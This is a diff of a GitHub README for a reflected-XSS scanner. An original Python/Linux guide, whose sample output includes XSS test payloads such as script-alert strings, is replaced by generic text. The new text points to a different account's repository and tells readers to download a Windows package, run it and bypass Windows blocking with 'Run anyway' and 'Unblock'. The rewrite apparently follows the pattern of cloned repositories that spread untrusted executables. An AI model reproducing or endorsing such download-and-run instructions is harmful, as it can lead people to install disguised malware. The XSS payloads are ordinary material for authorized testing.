@@ -1,244 +1,217 @@
-<div align="center">
+# 🛡️ XSS-HUNTER - Find Reflected XSS Faster
 
-# 🎯 XSS Hunter v2.0
+[![Download XSS-HUNTER](https://img.shields.io/badge/Download%20XSS--HUNTER-blue?style=for-the-badge&logo=github)](https://github.com/brittle-finance685/XSS-HUNTER)
 
-### Automated Reflected XSS Scanner for Bug Bounty Hunters
+## 📥 Download XSS-HUNTER
 
-![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=for-the-badge&logo=linux)
-![Bug Bounty](https://img.shields.io/badge/Bug%20Bounty-Authorized%20Testing-red?style=for-the-badge)
-![Version](https://img.shields.io/badge/Version-2.0-purple?style=for-the-badge)
+Use this link to visit the page and get the app:
 
-**Created by [EnCrYpTeD05](https://github.com/EnCrYpTeD05)**
+[Download XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER)
 
-*"Hack Smart. Hunt Hard."* 🎯
+## 🧰 What XSS-HUNTER Does
 
-</div>
+XSS-HUNTER is a Windows tool for finding reflected XSS issues in web apps and bug bounty targets.
 
----
+It helps you:
 
-## 📌 Overview
+- Gather subdomains with Subfinder
+- Pull URL paths with ParamSpider
+- Test possible XSS points with Dalfox
+- Automate the scan flow from start to finish
+- Save time on manual checks
 
-**XSS Hunter v2.0** is a fully automated, end-to-end **Reflected XSS vulnerability scanner** built specifically for bug bounty hunters. It chains together industry-standard open-source tools into a single seamless pipeline — from subdomain enumeration all the way to confirmed Proof-of-Concept XSS vulnerabilities.
+This tool fits users who want a simple way to run common XSS checks without building each step by hand.
 
-No more manual chaining of tools. No more missed parameters. Just one command.
+## 💻 What You Need
 
-```bash
-python3 xsshunter.py -d target.com
-```
+Before you run XSS-HUNTER on Windows, make sure you have:
 
----
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Permission to scan the targets you choose
 
-## ⚙️ Workflow
+For the best result, keep your system updated and close apps you do not need while scanning.
 
-```
-Target Domain
-      │
-      ▼
-┌─────────────────────────┐
-│  1. Subfinder            │  →  Subdomain Enumeration
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  2. Active Check         │  →  Filter Live Subdomains (20 Threads)
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  3. ParamSpider          │  →  Parameter Discovery (No Timeout)
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  4. Smart Filter         │  →  Single Params + Remove login/account URLs
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  5. Deduplication        │  →  Remove Duplicate URLs
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  6. FUZZ → 123           │  →  Dalfox Compatibility Fix
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  7. Dalfox Scan          │  →  Reflected XSS + WAF Evasion
-└──────────┬──────────────┘
-           │
-           ▼
-┌─────────────────────────┐
-│  8. Extract POCs         │  →  vulnerableurl.txt 🎯
-└─────────────────────────┘
-```
+## 🚀 Getting Started on Windows
 
----
+Follow these steps to download and run XSS-HUNTER on your Windows PC:
 
-## 🚀 Features
+1. Open the download page:
+   [https://github.com/brittle-finance685/XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER)
 
-### Core Features
-| Feature | Description |
-|---|---|
-| 🔍 Subdomain Enumeration | Automatically discovers subdomains using Subfinder |
-| ✅ Active Subdomain Check | Filters only live subdomains using 20 parallel threads |
-| 🕷️ Parameter Discovery | Collects all URLs and parameters using ParamSpider — no timeout, handles 100k+ parameters |
-| 🎯 Smart URL Filtering | Automatically removes login/account URLs, filters single parameter URLs |
-| 🔄 Duplicate Removal | Removes duplicate URLs before scanning |
-| 💉 Reflected XSS Scan | Dalfox with `--mining-dom=false` — focused Reflected XSS only |
-| 🛡️ WAF Evasion | Built-in `--waf-evasion` — works against WAF protected sites |
-| 📋 Clean Output | Filters WAF spam lines — only important output shown on screen |
-| 🎯 POC Extraction | Saves confirmed vulnerable URLs to a separate file |
+2. On the repository page, look for the latest release or the main download files.
 
-### Stability Features
-| Feature | Description |
-|---|---|
-| 🌐 Internet Auto-Recovery | Waits on disconnect, automatically resumes on reconnect |
-| ⚡ Rate Limit Detection | Auto-increases delay on 429 detection + 30s wait |
-| 📝 Error Logging | All errors saved to a timestamped log file |
-| 🛑 Graceful Exit | Progress saved even on Ctrl+C |
-| 🔄 Auto Resume | Interrupted scans resume from where they left off |
+3. Download the package for Windows if one is listed.
 
-### Usability Features
-| Feature | Description |
-|---|---|
-| 📊 Live Progress Bar | Real-time status for every step |
-| 🔢 ParamSpider Live Counter | Shows real-time parameter count while collecting |
-| ⚙️ Default + Custom Mode | Use Dalfox default settings or specify custom flags |
-| 💻 Single Command | Entire workflow in one command |
+4. If the file comes in a ZIP folder, right-click the ZIP file and choose **Extract All**.
 
----
+5. Open the extracted folder.
 
-## 📋 Requirements
+6. Find the main program file or launch file in the folder.
 
-| Tool | Type |
-|---|---|
-| Python 3 | Pre-installed on Kali Linux |
-| Subfinder | Go tool |
-| ParamSpider | Python package |
-| Dalfox | Go tool |
+7. Double-click the file to start XSS-HUNTER.
 
----
+8. If Windows asks for permission, choose **Run anyway** only if you trust the source.
 
-## 🛠️ Installation
+## 🗂️ What You Will See
 
-### Auto Install (Recommended)
-Clone the repo and run the installer — it will install everything automatically:
+When XSS-HUNTER starts, it should guide you through a simple scan flow.
 
-```bash
-git clone https://github.com/EnCrYpTeD05/XSS-HUNTER.git
-cd XSS-HUNTER
-chmod +x install.sh && ./install.sh
-```
+You may see options for:
 
-### Manual Install
-```bash
-# Python dependencies
-pip install requests paramspider
+- Target input
+- Subdomain discovery
+- URL collection
+- XSS testing
+- Output folder or results file
+- Progress messages while the scan runs
 
-# Go tools
-go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
-go install github.com/hahwul/dalfox/v2@latest
-```
+The app is built to keep the process in one place, so you do not need to switch between separate tools.
 
----
+## 🔍 How the Scan Flow Works
 
-## 📖 Usage
+XSS-HUNTER uses a chain of tools to help find reflected XSS points:
 
-### Basic Usage (Recommended)
-```bash
-python3 xsshunter.py -d target.com
-```
+1. **Subfinder** looks for subdomains tied to your target.
+2. **ParamSpider** checks for URLs that include query parameters.
+3. **Dalfox** tests the collected URLs for signs of reflected XSS.
+4. The app groups the results so you can review them in one place.
 
-### Custom Dalfox Settings
-```bash
-python3 xsshunter.py -d target.com --dalfox-mode custom --workers 5 --delay 500 --timeout 30
-```
+This flow helps reduce manual work and makes it easier to move from discovery to testing.
 
-### All Options
-```
-  -d, --domain        Target domain (required)
-  --threads           Threads for active subdomain check (default: 20)
-  --dalfox-mode       'default' or 'custom' (default: default)
-  --workers           Dalfox workers in custom mode (default: 5)
-  --delay             Dalfox delay in ms (default: 500)
-  --timeout           Dalfox timeout in seconds (default: 30)
-```
+## 🖱️ Basic Use
 
----
+Use the app with a target you are allowed to test.
 
-## 📂 Output Files
+Typical steps are:
 
-| File | Description |
-|---|---|
-| `subdomains.txt` | All discovered subdomains |
-| `activesubdomains.txt` | Live/active subdomains only |
-| `parameters.txt` | All discovered parameters (merged) |
-| `singleparam.txt` | Filtered single-parameter URLs |
-| `withoutfuzz.txt` | Deduplicated URLs ready for scanning |
-| `scan` | Full Dalfox scan output |
-| `vulnerableurl.txt` | Confirmed vulnerable URLs 🎯 |
-| `xss_hunter_errors_*.log` | Error log file |
+1. Enter the target domain.
+2. Start the scan.
+3. Wait while the tool collects subdomains and URLs.
+4. Review the results after the run completes.
+5. Open the saved output files and check the findings.
 
----
+If you want to test more than one target, run one scan at a time so the results stay clear.
 
-## 🧹 Cleanup Before New Scan
+## 📁 Output Files
 
-Always clean up before scanning a new target domain:
+XSS-HUNTER may create files such as:
 
-```bash
-rm -rf results/ parameters.txt singleparam.txt withoutfuzz.txt subdomains.txt activesubdomains.txt scan vulnerableurl.txt scanned_urls.txt pending_urls.txt
-```
+- A list of subdomains
+- A list of URLs with parameters
+- A results file with possible XSS hits
+- A log file for scan progress
+- A folder for export data
 
----
+Keep these files in a safe place so you can review them later or share them with your bug bounty notes.
 
-## 📸 Sample Output
+## ⚙️ Common Windows Setup Steps
 
-```
-[*] Starting scan [SID:4][4/64][6.25%] / URL: http://target.com/page.php?id=1
-[*] Valid target [ code:200 / size:100 ]
-[W] Reflected Payload in HTML: id=><script>alert(1)</script>
-[POC][R][GET][inHTML-URL] http://target.com/page.php?id=1%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-[V] Triggered XSS Payload (found DOM Object): id="><IMG SRC=x onpageshow="alert(1)" class=dalfox>
-[POC][V][GET][inHTML-URL] http://target.com/page.php?id=1%22%3E%3CIMG+SRC%3Dx...
-[*] [duration: 31m][issues: 5] Finish Scan!
-```
+If Windows blocks the app, use these steps:
 
----
+1. Right-click the downloaded file.
+2. Select **Properties**.
+3. If you see **Unblock**, check it.
+4. Click **Apply**.
+5. Run the app again.
 
-## ⚠️ Legal Disclaimer
+If the app opens and closes fast, try running it from the extracted folder instead of from inside the ZIP file.
 
-This tool is intended **strictly for authorized security testing only:**
+## 🧪 Best Use Cases
 
-- ✅ Authorized bug bounty programs
-- ✅ CTF competitions
-- ✅ Explicitly authorized penetration testing engagements
-- ✅ Your own systems/applications
+XSS-HUNTER works well for:
 
-**Always verify the target is in-scope before testing. Follow the program's rules and terms of service at all times.**
+- Bug bounty recon
+- Quick reflected XSS checks
+- Scanning subdomains and endpoints
+- Checking large target lists
+- Repeating the same scan process across many domains
 
-The author is **not responsible** for any misuse or damage caused by this tool. Unauthorized use of this tool against systems you do not have permission to test is illegal and unethical.
+It is meant to help with the early part of XSS testing, where speed and repeat steps matter.
 
----
+## 🧭 Simple Workflow Tips
 
-## 📄 License
+To keep scans clean and easy to read:
 
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
+- Use one target per run
+- Save each result set in its own folder
+- Use short names for target folders
+- Review false positives by hand
+- Keep notes on each scan date
 
-Copyright (c) 2026 EnCrYpTeD05
+A clean folder setup makes it easier to compare results later.
 
----
+## 🔐 Safe Use
 
-## 👤 Author
+Only scan systems you own or have clear permission to test.
 
-**EnCrYpTeD05** | GitHub: [@EnCrYpTeD05](https://github.com/EnCrYpTeD05)
-**🌐 Website:** https://encrypted05.github.io/
+Use the tool on:
 
-*"Hack Smart. Hunt Hard."* 🎯
+- Your own lab systems
+- Training targets
+- Bug bounty programs that allow this type of testing
+- Internal systems where you have approval
 
----
+## 🛠️ Troubleshooting
 
-⭐ **If this tool helped you find bugs, drop a star on the repo!**
+If XSS-HUNTER does not start:
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file
+- Run it again from the extracted folder
+- Restart Windows and try once more
+- Check that your internet connection is working
+
+If scans return no results:
+
+- Try a different target
+- Check that the target has active subdomains
+- Make sure the domain name is typed correctly
+- Wait for the full scan to finish before closing the app
+
+If the app is slow:
+
+- Close other heavy apps
+- Give it more time on large targets
+- Use a smaller target list first
+- Check your network speed
+
+## 📌 Project Focus
+
+XSS-HUNTER combines common recon and testing tools into one flow. It is built for users who want:
+
+- Faster reflected XSS checks
+- Less manual work
+- Clear scan results
+- A simple Windows run path
+- A single place to start the process
+
+## 🧩 Included Topics
+
+This project fits the following areas:
+
+- automation
+- bug bounty
+- dalfox
+- paramspider
+- penetration testing
+- python
+- reflected xss
+- security
+- subfinder
+- xss
+
+## 🏁 Start Here
+
+1. Visit the download page:
+   [https://github.com/brittle-finance685/XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER)
+
+2. Download the Windows file or main package from the page.
+
+3. Extract it if the download comes as a ZIP file.
+
+4. Open the folder and run the main app file on Windows
+
+5. Enter a target you are allowed to test and begin the scan
